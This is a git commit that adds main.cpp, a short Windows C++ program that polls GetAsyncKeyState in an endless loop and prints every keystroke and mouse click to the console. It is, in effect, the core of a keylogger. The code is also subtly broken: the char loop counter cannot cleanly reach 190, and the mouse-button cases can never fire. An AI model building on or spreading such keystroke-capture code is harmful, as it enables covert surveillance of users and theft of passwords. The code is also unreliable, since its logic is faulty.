a88a693ffee0001de77c8df0b5738f8071bccb75
Jack Shirley <blitz1244@gmail.com>
2020-06-25 01:38:13 -0500

    init

---
+++ main.cpp
@@ -0,0 +1,51 @@
+#include <stdio.h>
+#include <iostream>
+#include <conio.h>
+#include <winuser.h>
+#include <windows.h>
+#include <string>
+
+using namespace std;
+
+void ezprint(string str)
+{
+    cout << str << endl;
+}
+
+int main()
+{
+    char key;
+
+    while (TRUE)
+    {
+        for (key = 8; key <= 190; key++)
+        {
+            if (GetAsyncKeyState(key) == -32767)
+            {
+                switch (key)
+                {
+                case 8:
+                    ezprint("<Backspace>");
+                    break;
+                case 32:
+                    ezprint("<Space>");
+                    break;
+                case VK_SHIFT:
+                    ezprint("<Shift>");
+                    break;
+                case VK_LBUTTON:
+                    ezprint("<Left Click>");
+                    break;
+                case VK_RBUTTON:
+                    ezprint("<Right Click>");
+                    break;
+                case 64:
+                    ezprint("@");
+                    break;
+                default:
+                    cout << key << endl;
+                }
+            }
+        }
+    }
+}
